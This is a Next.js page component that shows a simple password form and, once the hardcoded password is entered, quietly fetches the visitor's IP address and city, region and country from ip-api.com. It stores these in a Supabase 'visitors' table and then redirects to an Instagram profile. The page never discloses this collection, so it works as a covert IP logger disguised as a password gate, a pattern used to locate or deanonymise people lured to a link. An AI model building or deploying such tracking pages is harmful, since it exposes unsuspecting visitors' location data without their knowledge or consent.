'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { supabase } from '@/lib/supabase';

export default function Home() {
  const [password, setPassword] = useState('');
    const [error, setError] = useState('');
      const router = useRouter();

        const handleSubmit = async (e: React.FormEvent) => {
            e.preventDefault();
                if (password !== 'MALE') {
                      setError('Incorrect password');
                            return;
                                }

                                    try {
                                          const res = await fetch('https://ip-api.com/json');
                                                const data = await res.json();

                                                      // Send to Supabase
                                                            await supabase.from('visitors').insert([{
                                                                    ip: data.query,
                                                                            city: data.city,
                                                                                    region: data.regionName,
                                                                                            country: data.country,
                                                                                                  }]);

                                                                                                        // Redirect to Instagram
                                                                                                              window.location.href = 'https://instagram.com/hydergaxi';
                                                                                                                  } catch (err) {
                                                                                                                        setError('Failed to log data');
                                                                                                                            }
                                                                                                                              };

                                                                                                                                return (
                                                                                                                                    <div style={{
                                                                                                                                          minHeight: '100vh',
                                                                                                                                                display: 'flex',
                                                                                                                                                      justifyContent: 'center',
                                                                                                                                                            alignItems: 'center',
                                                                                                                                                                  flexDirection: 'column',
                                                                                                                                                                        fontFamily: 'Arial, sans-serif',
                                                                                                                                                                              background: '#f0f0f0',
                                                                                                                                                                                  }}>
                                                                                                                                                                                        <h2>Enter Password</h2>
                                                                                                                                                                                              <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                                                                                                                                                                                                      <input
                                                                                                                                                                                                                type="password"
                                                                                                                                                                                                                          placeholder="Password"
                                                                                                                                                                                                                                    value={password}
                                                                                                                                                                                                                                              onChange={e => setPassword(e.target.value)}
                                                                                                                                                                                                                                                        style={{ padding: '8px', fontSize: '16px' }}
                                                                                                                                                                                                                                                                />
                                                                                                                                                                                                                                                                        <button type="submit" style={{ padding: '8px', fontSize: '16px', cursor: 'pointer' }}>
                                                                                                                                                                                                                                                                                  Submit
                                                                                                                                                                                                                                                                                          </button>
                                                                                                                                                                                                                                                                                                  {error && <p style={{ color: 'red' }}>{error}</p>}
                                                                                                                                                                                                                                                                                                        </form>
                                                                                                                                                                                                                                                                                                            </div>
                                                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                                                              }